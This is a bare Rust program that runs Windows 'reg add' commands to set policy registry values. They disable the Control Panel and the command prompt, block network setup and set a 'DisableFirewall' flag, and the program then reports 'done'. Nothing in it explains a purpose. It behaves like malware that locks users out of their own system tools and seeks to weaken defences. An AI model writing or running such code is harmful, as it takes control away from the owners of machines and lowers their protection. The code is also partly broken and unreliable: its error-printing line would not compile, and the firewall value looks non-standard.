use std::process::{Command, exit};
use std::io::{self, Write};

fn modify_registry() -> io::Result<()> {

    let _ = Command::new("reg")
        .arg("add")
        .arg("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
        .arg("/v")
        .arg("NoControlPanel")
        .arg("/t")
        .arg("REG_DWORD")
        .arg("/d")
        .arg("1")
        .arg("/f")
        .output()?;

    let _ = Command::new("reg")
        .arg("add")
        .arg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        .arg("/v")
        .arg("DisableCMD")
        .arg("/t")
        .arg("REG_DWORD")
        .arg("/d")
        .arg("1")
        .arg("/f")
        .output()?;

    let _ = Command::new("reg")
        .arg("add")
        .arg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Network")
        .arg("/v")
        .arg("NoNetSetup")
        .arg("/t")
        .arg("REG_DWORD")
        .arg("/d")
        .arg("1")
        .arg("/f")
        .output()?;

    let _ = Command::new("reg")
        .arg("add")
        .arg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        .arg("/v")
        .arg("DisableFirewall")
        .arg("/t")
        .arg("REG_DWORD")
        .arg("/d")
        .arg("1")
        .arg("/f")
        .output()?;

    Ok(())
}

fn main() {
    match modify_registry() {
        Ok(_) => {
            println!("done");
            exit(0);
        }
        Err(e) => {
            eprintln!("err", e);
            exit(1);
        }
    }
}
